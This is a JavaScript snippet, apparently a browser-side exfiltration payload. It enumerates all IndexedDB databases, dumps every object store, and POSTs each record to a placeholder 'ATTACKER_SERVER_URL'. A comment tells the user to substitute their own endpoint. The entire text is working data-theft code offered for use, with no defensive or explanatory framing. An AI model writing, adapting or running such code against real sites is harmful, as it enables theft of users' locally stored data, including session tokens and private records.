const dumpIndexedDB = dbName => {
  const DB_VERSION = 1;
  const req = indexedDB.open(dbName, DB_VERSION);
  req.onsuccess = function() {
    const db = req.result;
    const objectStoreNames = db.objectStoreNames || [];
    console.log(`[*] Database: ${dbName}`);
    Array.from(objectStoreNames).forEach(storeName => {
      const txn = db.transaction(storeName, 'readonly');
      const objectStore = txn.objectStore(storeName);
      console.log(`\t[+] ObjectStore: ${storeName}`);
      objectStore.getAll().onsuccess = event => {
        const items = event.target.result || [];
        items.forEach(item => {
          // Exfiltrate item. Here, we assume a fetch to an attacker server.
          // Replace 'ATTACKER_SERVER_URL' with your actual endpoint.
          fetch('ATTACKER_SERVER_URL', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({ db: dbName, store: storeName, data: item }),
          });
        });
      };
    });
  };
};

// Find the correct DB name by listing all databases
indexedDB.databases().then(dbs => {
  dbs.forEach(dbInfo => {
    dumpIndexedDB(dbInfo.name);
  });
});
